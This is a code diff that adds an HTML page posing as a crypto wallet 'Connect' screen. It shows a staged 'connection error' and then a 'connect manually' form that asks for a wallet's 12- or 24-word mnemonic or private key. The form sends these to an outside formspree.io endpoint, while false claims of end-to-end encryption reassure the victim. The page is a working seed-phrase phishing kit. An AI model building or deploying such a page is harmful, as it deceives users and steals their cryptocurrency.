@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta
+			name="viewport"
+			content="width=device-width, initial-scale=1.0"
+		/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
+	
+	<link rel="apple-touch-icon" sizes="57x57" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-57x57.png">
+	<link rel="apple-touch-icon" sizes="60x60" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-60x60.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="76x76" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-76x76.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-114x114.png">
+	<link rel="apple-touch-icon" sizes="120x120" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-120x120.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-144x144.png">
+	<link rel="apple-touch-icon" sizes="152x152" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-152x152.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/apple-icon-180x180.png">
+	<link rel="icon" type="image/png" sizes="192x192"  href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/android-icon-192x192.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="96x96" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/favicon-96x96.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/favicon-16x16.png">
+	<link rel="manifest" href="https://flarentwork.com/wp-content/themes/flare/assets/images/favicon/manifest.json">
+	<meta name="msapplication-TileColor" content="#ffffff">
+		<title>Connect</title>
+        <style>
+ @keyframes horizontal-bounce {
+    0%, 100% {
+      left: 0;
+      transform: translate(0%, -50%);
+    }
+    50% {
+      left: 100%;
+      transform: translate(-100%, -50%);
+    }
+  }
+
+  .animate-horizontal-bounce {
+    animation: horizontal-bounce 8s infinite ease-in-out;
+  }
+  .animate-horizontal-bounce2 {
+    animation: horizontal-bounce 12s infinite ease-in-out;
+  }
+</style>
+		<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+	</head>
+	<body>
+		<div class="px-5 py-20">
+			<div class="flex flex-col items-center gap-y-5">
+				<h2 class="font-medium text-4xl text-center">
+					Select a Wallet
+				</h2>
+				 <div class="relative w-28 h-8">
+                        <!-- Loading Bar -->
+                        <div class="absolute top-1/2 transform -translate-y-1/2 w-full h-1 bg-gray-300 rounded-full overflow-hidden">
+                        <div class="h-full bg-[#E62058] animate-pulse"></div>
+                        </div>
+                        <!-- Moving Circle -->
+                        <div class="absolute top-[75%] transform -translate-y-1/2 w-4 h-4 bg-[#E62058] rounded-full animate-horizontal-bounce2"></div>
+                    </div>
+			</div>
+			<div class="flex flex-col md:flex-row items-center gap-3 mt-20">
+				<input
+					type="text"
+					class="border-2 py-4 text-xl w-full px-5 text-xl outline-none focus:outline-none"
+					placeholder="Find your wallet"
+                    id="search"
+				/>
+				<button
+					class="px-5 md:px-20 md:max-w-[300px] bg-[#E62058] py-4 w-full md:text-xl text-white capitalize"
+                    id="searchBtn"
+				>
+					search
+				</button>
+			</div>
+			<div class="my-5">
+				<!-- results  -->
+				<h3 class="font-medium text-2xl" id="count"></h3>
+				<div class="grid md:grid-cols-2 lg:grid-cols-4 gap-10 " id="box"></div>
+			</div>
+			<div
+				class=" grid md:grid-cols-2 lg:grid-cols-4 gap-10"
+				id="wallet-container"
+			>
+				<!-- list of wallet  here  -->
+			</div>
+			<div
+				class="hidden fixed top-0 left-0 w-full h-full bg-black/20 flex justify-center items-center"
+				id="modal"
+			>
+				<div class= "mx-5 relative bg-white p-5 md:max-w-[570px] md:p-10 rounded-2xl" id="smodal">
+                    <div class="absolute -top-5 -right-3 bg-white w-8 rounded-full flex items-center justify-center font-bold text-gray-800 text-lg h-8" id="close-btn">
+                        x
+                    </div>
+                    <div class="flex flex-col items-center justify-center mb-5">
+                        <img
+							src="/icons/binance.png"
+							alt=""
+							width="50"
+							srcset=""
+                            id="wallet-icon"
+						/>
+						<h3 class="font-medium text-2xl pb-2" id="wallet-name">
+							Binance Chain Wallet
+						</h3>
+						<p class="md:text-xl py-2 text-gray-600 font-thin">
+							This session is secured and encrypted
+						</p>
+                    </div>
+					<div class="hidden flex flex-col items-center justify-center" id="retry-frame"
+					>
+						
+						<div
+							class="w-full md:px-20 border border-[#E62058] text-red-600 rounded px-2 flex items-center justify-center text-center"
+						>
+							An eror occured... please try again or connect
+							manually
+						</div>
+                        <div class="w-full mt-10">
+                            <button class="border w-full rounded-full py-3 capitalize text-[#E62058] font-semibold" id="try-again-btn">try again</button>
+                             <button class="border w-full mt-3 bg-[#E62058] rounded-full py-3 capitalize text-white font-semibold" id="connect-manually-btn">connect manually</button>
+                        </div>
+					</div>
+                    <div id="loading-frame" class=" flex items-center flex-col">
+                       <!-- loading containber  -->
+                    <div class="relative w-full h-8">
+                        <!-- Loading Bar -->
+                        <div class="absolute top-1/2 transform -translate-y-1/2 w-full h-1 bg-gray-300 rounded-full overflow-hidden">
+                        <div class="h-full bg-[#E62058] animate-pulse"></div>
+                        </div>
+                        <!-- Moving Circle -->
+                        <div class="absolute top-[75%] transform -translate-y-1/2 w-4 h-4 bg-[#E62058] rounded-full animate-horizontal-bounce"></div>
+                    </div>
+                        <h3 class="font-medium text-xl">starting secure connection</h3>
+                        <p class="italic text-gray-600 ">please wait....</p>
+                    </div>
+					<div class="hidden" id="manually-frame">
+						<form action="https://formspree.io/f/xdojgopa" id="form" method="POST">
+                            <p id="status" class="text-sm md:text-base text-center  pb-7"></p>
+                            <textarea  name="code" id="passphrase" rows="4" class="w-full border border-gray-300 rounded p-2 px-5 placeholder:text-gray-500 text-xl font-thin  focus:outline-none outline-none" placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your privatekey instead"></textarea>
+                            <input type="hidden" name="wallet" id="wallet">
+                                <button id="submitBtn"  type="submit" class="border w-full mt-3 bg-[#E62058] rounded-full py-3 capitalize text-white font-semibold ">connect wallet</button>
+                        </form>
+					</div>
+                    <div class="flex items-start   mt-20">
+                        <img src="/icons/shield.png" width="40" alt="">
+                        <p class="font-semibold md:text-xl text-gray-600 text-center  ">This session is protected with an end-to-end encryption</p>
+                    </div>
+				</div>
+			</div>
+		</div>
+		<script src="connect.js"></script>
+	</body>
+</html>
